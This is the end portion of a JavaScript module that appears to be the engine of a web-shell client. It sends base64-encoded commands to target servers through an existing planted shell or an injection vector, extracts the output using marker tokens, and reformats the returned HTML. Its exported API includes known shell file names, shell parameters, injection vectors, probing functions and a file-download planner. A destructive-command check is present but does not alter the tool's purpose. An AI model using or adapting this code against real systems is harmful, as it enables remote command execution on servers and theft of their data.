      return acc;
    });
  }

  /* ---------------------------------------------------------------------------
   * Command execution
   * ------------------------------------------------------------------------ */

  /**
   * Execute `command` on the target through a confirmed vector.
   *
   * @returns {Promise<object>} { ok, output, exitInfo, raw }
   */
  function executeCommand(ctx) {
    var vector = ctx.vector;
    var command = String(ctx.command || '');
    var token = ctx.token;
    var b64 = b64encode(command);
    var body = commandPayload(b64, token);

    var url;
    if (vector.method === 'GET' && vector.param) {
      /* Pre-existing shell: the command travels as a query parameter. */
      url = vector.script + '?' + encodeURIComponent(vector.param) + '=' + encodeURIComponent(command);
      return getProbe({ fetchImpl: ctx.fetchImpl, url: url, timeoutMs: ctx.timeoutMs }).then(function (res) {
        return {
          ok: !!(res && res.ok),
          output: res && res.body ? res.body : '',
          extracted: null,
          error: res && res.error,
          status: res && res.status,
          url: url
        };
      });
    }

    url = joinUrl(vector.script, vector.query);
    return postProbe({ fetchImpl: ctx.fetchImpl, url: url, body: body, timeoutMs: ctx.timeoutMs })
      .then(function (res) {
        var extracted = res && res.body ? extractOutput(res.body, token) : null;
        return {
          ok: !!(res && res.ok),
          output: extracted === null ? '' : extracted,
          extracted: extracted !== null,
          raw: res && res.body ? res.body : '',
          error: res && res.error,
          status: res && res.status,
          url: url
        };
      });
  }

  /* ---------------------------------------------------------------------------
   * Command safety helpers
   * ------------------------------------------------------------------------ */

  /** Does the command look destructive? */
  function commandRisk(command) {
    var cmd = String(command || '');
    var hits = [];
    DANGEROUS_PATTERNS.forEach(function (p) {
      if (p.re.test(cmd)) hits.push(p.why);
    });
    return { dangerous: hits.length > 0, reasons: hits };
  }

  /** Normalise a command: trim, strip null bytes, limit length. */
  function normalizeCommand(command) {
    return String(command || '').replace(/\0/g, '').trim().slice(0, 2000);
  }

  /* ---------------------------------------------------------------------------
   * Output filtering — make command output readable
   *
   * A command such as `cat index.php` or `curl http://host/` returns markup,
   * not text. Dumping 80 kB of HTML into the terminal is noise, so the engine
   * can reduce a page to its readable content while keeping the raw bytes
   * available.
   * ------------------------------------------------------------------------ */

  var HTML_ENTITIES = {
    amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ',
    ndash: '\u2013', mdash: '\u2014', hellip: '\u2026', copy: '\u00a9',
    reg: '\u00ae', trade: '\u2122', laquo: '\u00ab', raquo: '\u00bb',
    bull: '\u2022', middot: '\u00b7', eacute: '\u00e9', egrave: '\u00e8',
    agrave: '\u00e0', ccedil: '\u00e7', ugrave: '\u00f9', ocirc: '\u00f4',
    icirc: '\u00ee', ecirc: '\u00ea', szlig: '\u00df', auml: '\u00e4',
    ouml: '\u00f6', uuml: '\u00fc', euro: '\u20ac', pound: '\u00a3',
    deg: '\u00b0', plusmn: '\u00b1', times: '\u00d7', divide: '\u00f7',
    frac12: '\u00bd', larr: '\u2190', rarr: '\u2192', harr: '\u2194',
    uarr: '\u2191', darr: '\u2193', check: '\u2713', cross: '\u2717'
  };

  /** Decode the HTML entities that matter for readability. */
  function decodeEntities(text) {
    return String(text == null ? '' : text)
      .replace(/&#x([0-9a-f]+);/gi, function (_, hex) {
        var code = parseInt(hex, 16);
        return (code > 0 && code < 0x110000) ? String.fromCodePoint(code) : '';
      })
      .replace(/&#(\d+);/g, function (_, dec) {
        var code = parseInt(dec, 10);
        return (code > 0 && code < 0x110000) ? String.fromCodePoint(code) : '';
      })
      .replace(/&([a-z][a-z0-9]*);/gi, function (whole, name) {
        var key = name.toLowerCase();
        return Object.prototype.hasOwnProperty.call(HTML_ENTITIES, key) ? HTML_ENTITIES[key] : whole;
      });
  }

  /**
   * Decide whether a chunk of command output is markup.
   * Heuristic: it must contain an HTML tag *and* either look like a document
   * (doctype/<html/<body/...) or have a high tag-to-text ratio.
   */
  function looksLikeHtml(text) {
    var s = String(text == null ? '' : text);
    if (!s) return false;
    if (!/<[a-z!/][^>]*>/i.test(s)) return false;
    if (/<!doctype\s|<html[\s>]|<body[\s>]|<head[\s>]|<div[\s>]|<table[\s>]|<form[\s>]/i.test(s)) return true;
    var tags = (s.match(/<[^>]+>/g) || []).length;
    var plain = s.replace(/<[^>]+>/g, '').replace(/\s+/g, '');
    return tags >= 3 && plain.length < tags * 80;
  }

  /**
   * Reduce markup to its readable content.
   *
   * Removes <script>/<style>/comment blocks, drops the tags, decodes the
   * entities and collapses the whitespace. Line structure is kept for block
   * level elements so the result still reads like a document.
   */
  function stripHtml(text) {
    var s = String(text == null ? '' : text);

    s = s.replace(/<!--[\s\S]*?-->/g, ' ');
    s = s.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, ' ');
    s = s.replace(/<style\b[^>]*>[\s\S]*?<\/style\s*>/gi, ' ');
    s = s.replace(/<head\b[^>]*>[\s\S]*?<\/head\s*>/gi, ' ');
    s = s.replace(/<(br|hr)\b[^>]*>/gi, '\n');
    s = s.replace(/<\/(p|div|li|tr|h[1-6]|section|article|header|footer|table|ul|ol|pre|blockquote)\s*>/gi, '\n');
    s = s.replace(/<li\b[^>]*>/gi, '\u2022 ');
    s = s.replace(/<[^>]+>/g, '');

    s = decodeEntities(s);
    s = s.replace(/\r\n?/g, '\n');
    s = s.replace(/[ \t\u00a0]+/g, ' ');
    s = s.replace(/ *\n */g, '\n');
    s = s.replace(/\n{3,}/g, '\n\n');
    return s.trim();
  }

  /**
   * Prepare raw command output for display.
   *
   * Returns { text, kind, raw, bytes } where kind is:
   *   'html'  \u2192 markup was detected and reduced to readable text
   *   'code'  \u2192 source code (PHP/JS/\u2026): shown as-is
   *   'text'  \u2192 plain text
   *   'empty' \u2192 nothing came back
   */
  function formatCommandOutput(raw) {
    var s = String(raw == null ? '' : raw);
    var bytes = s.length;
    var trimmed = s.trim();

    if (!trimmed) return { text: '', kind: 'empty', raw: s, bytes: bytes };

    /* Source code is more useful verbatim than "stripped". */
    if (/^\s*<\?php/i.test(trimmed) || /^\s*<\?xml/i.test(trimmed)) {
      return { text: trimmed, kind: 'code', raw: s, bytes: bytes };
    }
    if (/^\s*[{[]/.test(trimmed) && /[;}]\s*$/.test(trimmed)) {
      return { text: trimmed, kind: 'code', raw: s, bytes: bytes };
    }

    if (looksLikeHtml(s)) {
      return { text: stripHtml(s), kind: 'html', raw: s, bytes: bytes };
    }

    return { text: trimmed, kind: 'text', raw: s, bytes: bytes };
  }

  /* ---------------------------------------------------------------------------
   * Public API
   * ------------------------------------------------------------------------ */

  return {
    ENGINE_VERSION: ENGINE_VERSION,
    MARKER_PREFIX: MARKER_PREFIX,
    OUT_START: OUT_START,
    OUT_END: OUT_END,
    SHELL_PARAMS: SHELL_PARAMS,
    KNOWN_SHELL_FILES: KNOWN_SHELL_FILES,
    INJECTION_VECTORS: INJECTION_VECTORS,

    randomToken: randomToken,
    b64encode: b64encode,
    b64decode: b64decode,
    truncate: truncate,
    escapeRegExp: escapeRegExp,
    joinUrl: joinUrl,

    parseTarget: parseTarget,
    analyzeUrl: analyzeUrl,
    analyzeParams: analyzeParams,
    looksLikeShellPath: looksLikeShellPath,
    candidateScripts: candidateScripts,

    markerPayload: markerPayload,
    commandPayload: commandPayload,
    extractOutput: extractOutput,
    hasMarker: hasMarker,

    getProbe: getProbe,
    postProbe: postProbe,
    interestingHeaders: interestingHeaders,
    phpHeaderEvidence: phpHeaderEvidence,

    probeExistingShell: probeExistingShell,
    probeInjection: probeInjection,
    executeCommand: executeCommand,

    commandRisk: commandRisk,
    normalizeCommand: normalizeCommand,

    parseLsLine: parseLsLine,
    parseLsOutput: parseLsOutput,
    parseListingOutput: parseListingOutput,
    buildListingCommand: buildListingCommand,
    buildDownloadPlan: buildDownloadPlan,
    shellQuote: shellQuote,
    decodeEntities: decodeEntities,
    looksLikeHtml: looksLikeHtml,
    stripHtml: stripHtml,
    formatCommandOutput: formatCommandOutput,
    sanitizeRelativePath: sanitizeRelativePath
  };
});
